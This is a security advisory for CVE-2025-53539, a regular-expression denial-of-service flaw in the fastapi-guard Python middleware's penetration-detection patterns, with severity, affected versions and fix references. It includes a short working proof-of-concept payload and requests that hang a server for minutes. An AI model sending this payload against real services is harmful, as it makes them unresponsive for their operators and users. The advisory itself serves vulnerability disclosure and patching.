# [M] fastapi-guard is vulnerable to ReDoS through inefficient regex

## Summary
Severity: Medium
Advisory: GHSA-j47q-rc62-w448
CVE: CVE-2025-53539
CWE: CWE-1333
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-07-07
Source: https://github.com/advisories/GHSA-j47q-rc62-w448
Type: github-advisory

## Affected
- PyPI: `fastapi-guard` — affected >=0 <3.0.1

## Details
### Summary

fastapi-guard detects penetration attempts by using regex patterns to scan incoming requests. However, some of the regex patterns used in detection are extremely inefficient and can cause polynomial complexity backtracks when handling specially crafted inputs.

It is not as severe as _exponential_ complexity ReDoS, but still downgrades performance and allows DoS exploits. An attacker can trigger high cpu usage and make a service unresponsive for hours by sending a single request in size of KBs.

### PoC

e.g. https://github.com/rennf93/fastapi-guard/blob/1e6c2873bfc7866adcbe5fc4da72f2d79ea552e7/guard/handlers/suspatterns_handler.py#L31C79-L32C7

```python
payload = lambda n: '<'*n+ ' '*n+ 'style=' + '"'*n + ' '*n+ 'url('*n # complexity: O(n^5)

print(requests.post("http://172.24.1.3:8000/", data=payload(50)).elapsed) # 0:00:03.771120
print(requests.post("http://172.24.1.3:8000/", data=payload(100)).elapsed) # 0:01:17.952637
print(requests.post("http://172.24.1.3:8000/", data=payload(200)).elapsed) # timeout (>15min)
```

Single-threaded uvicorn workers can not handle any other concurrent requests during the elapsed time.

### Impact

Penetration detection is enabled by default. Services that use fastapi-guard middleware without explicitly setting `enable_penetration_detection=False` are vulnerable to DoS.

## References
- https://github.com/rennf93/fastapi-guard/security/advisories/GHSA-j47q-rc62-w448
- https://nvd.nist.gov/vuln/detail/CVE-2025-53539
- https://github.com/rennf93/fastapi-guard/commit/d9d50e8130b7b434cdc1b001b8cfd03a06729f7f
- https://github.com/rennf93/fastapi-guard
